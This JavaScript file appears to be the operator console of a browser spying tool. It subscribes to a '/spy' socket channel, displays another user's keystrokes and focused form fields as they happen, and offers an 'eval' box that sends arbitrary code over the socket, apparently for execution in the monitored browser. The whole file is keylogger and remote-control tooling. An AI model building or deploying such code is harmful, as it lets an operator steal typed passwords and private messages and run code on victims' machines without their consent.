var messages = document.getElementById('messages');

chat = {
    newLineInitialised: false,
    append: function (key) {
        if (this.newLineInitialised) {
            this.newLine();
            this.newLineInitialised = false;
        }

        switch (key) {
            case 'Backspace':
                break;
            case 'Enter':
                key = '</br>'
            default:
                var lastLine = document.querySelector('#messages li:last-child');
                lastLine.innerHTML += key;
                this.newLineInitialised = false;
        }
    },
    newLine: function (msg) {
        var li = document.createElement('li');
        if (msg) {
            li.innerHTML = msg;
        }
        messages.appendChild(li);

        this.newLineInitialised = true;
    }
};

var lastElement = '';
var newLine = false;
elementChange = function (newElement) {
    if (lastElement !== newElement) {
        var message = 'User changed element to: <b>' + newElement + '</b>';
        chat.newLine(message);

        lastElement = newElement;
    }
};


const socket = io('/spy');

socket.on('type', function (key) {
    chat.append(key);
});

socket.on('focus', function (focus) {
    elementChange(focus);
});


const consoleInput = document.getElementById('console');
const evalButton = document.getElementById('eval');

evalButton.onclick = function () {
    if (console.value !== '') {
        socket.emit('eval', consoleInput.value);
        consoleInput.value = '';
    }
    return false;
};
